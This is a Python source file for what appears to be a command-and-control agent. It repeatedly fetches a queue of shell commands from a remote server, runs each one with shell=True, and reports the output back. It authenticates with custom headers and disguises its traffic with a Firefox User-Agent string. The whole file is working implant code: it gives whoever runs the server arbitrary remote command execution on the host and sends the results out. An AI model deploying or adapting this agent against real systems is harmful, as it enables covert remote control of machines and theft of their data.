import subprocess
import http.client
import json
import ssl

URL = "CHANGEME"
AGENT_ID = "CHANGEME"
USERNAME = "CHANGEME"
PASSWORD = "CHANGEME"
USERAGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0"
HEADERS = {
    "X-Agent-ID": AGENT_ID,
    "X-Username": USERNAME,
    "X-Password": PASSWORD,
    "User-Agent": USERAGENT,
    "Content-Type": "application/json",
}
DEBUG = False

# Optional. if you want to use client certificate authentication on the web server
CLIENT_CERT = None
CLIENT_KEY = None

def get_queue():
    conn = http.client.HTTPConnection(URL)
    headers = HEADERS.copy()
    headers["X-Action"] = "get_queue"
    try:
        conn.request("GET", "/", headers=headers)
        response = conn.getresponse()
        if response.status == 200:
            return json.loads(response.read().decode())
        else:
            print(f"Error: Received status {response.status}")
            return None
    except Exception as e:
        print(f"Error connecting to server: {e}")
        return None
    finally:
        conn.close()

def remove_from_queue(sequence):
    conn = http.client.HTTPConnection(URL)
    headers = HEADERS.copy()
    headers["X-Action"] = "remove_from_queue"
    headers["Sequence"] = str(sequence)
    try:
        conn.request("GET", "/", headers=headers)
        response = conn.getresponse()
        if response.status == 200:
            return json.loads(response.read().decode())
        else:
            print(f"Error: Received status {response.status}")
            return None
    except Exception as e:
        print(f"Error connecting to server: {e}")
        return None
    finally:
        conn.close()

def run_command(cmd):
    res = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    return res.decode()

def report_output(output, sequence):
    conn = http.client.HTTPConnection(URL)
    headers = HEADERS.copy()
    headers["X-Action"] = "report_output"
    data = {"result": output, "sequence": sequence}
    try:
        conn.request("GET", "/", headers=headers, body=json.dumps(data).encode())
        response = conn.getresponse()
        if response.status == 200:
            return json.loads(response.read().decode())
        else:
            print(f"Error: Received status {response.status}")
            return None
    except Exception as e:
        print(f"Error connecting to server: {e}")
        return None
    finally:
        conn.close()

if __name__ == "__main__":
    for job in get_queue():
        status = job.get("status", "unknown")
        if status != "queued":
            continue
        cmd = job["cmd"]
        sequence = job["sequence"]
        try:
            output = run_command(cmd)
        except subprocess.CalledProcessError as e:
            output = f"Command failed with error: {e.output.decode()}"
        if DEBUG:
            print(f"Running command: {cmd}")
            print(f"Output: {output}")
            print(f"Sequence: {sequence}")
        report_output(output, sequence)
